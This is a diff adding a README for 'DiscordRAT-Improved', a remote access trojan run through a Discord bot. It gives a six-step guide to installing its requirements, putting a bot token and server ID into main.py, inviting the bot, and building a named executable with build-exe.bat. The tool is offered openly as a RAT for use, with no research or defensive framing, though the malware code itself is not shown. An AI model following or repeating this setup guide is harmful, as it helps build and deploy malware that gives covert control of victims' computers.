@@ -1,0 +1,25 @@
+<p align="center">
+<img src="https://img.shields.io/github/languages/top/Rdimo/DiscordRAT-Improved?style=flat-square" </a>
+<img src="https://img.shields.io/github/last-commit/Rdimo/DiscordRAT-Improved?style=flat-square" </a>
+<img src="https://img.shields.io/github/stars/Rdimo/DiscordRAT-Improved?color=333333&label=Stars&style=flat-square" </a>
+<img src="https://img.shields.io/github/forks/Rdimo/DiscordRAT-Improved?color=333333&label=Forks&style=flat-square" </a>
+</p>
+
+#### DiscordRAT-Improved was made by
+Love ❌ code ✅
+
+## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟Star This Repository If You Liked DiscordRAT-Improved!
+
+---
+
+### 📁・Setting up the RAT
+1. Start off by ofc installing [python](https://www.python.org/)
+2. Download the code now and open a cmd in the directory and type `pip install -r requirements.txt`
+3. Now time to get the bot token, follow this guide [here](https://www.writebots.com/discord-bot-token) on how to do that
+4. Go into main.py
+   - go to where it says `token = 'BOT_TOKE_HERE'` (line 35)
+     - Replace `BOT_TOKE_HERE` with your bot token that you got from the [developer page](https://discord.com/developers)
+       - go to where it says `g = [GUILD_ID_HERE]` (line 36)
+         - Replace `GUILD_ID_HERE` with the id of your server that you want the bot to be in ([where to find server id?](https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID))
+5. Now your ready to invite your bot to your server, simply follow [this guide](https://discordjs.guide/preparations/adding-your-bot-to-servers.html#bot-invite-links)
+6. When your done with all of that, simply open **build-exe.bat** and enter a name for the exe and now your done!
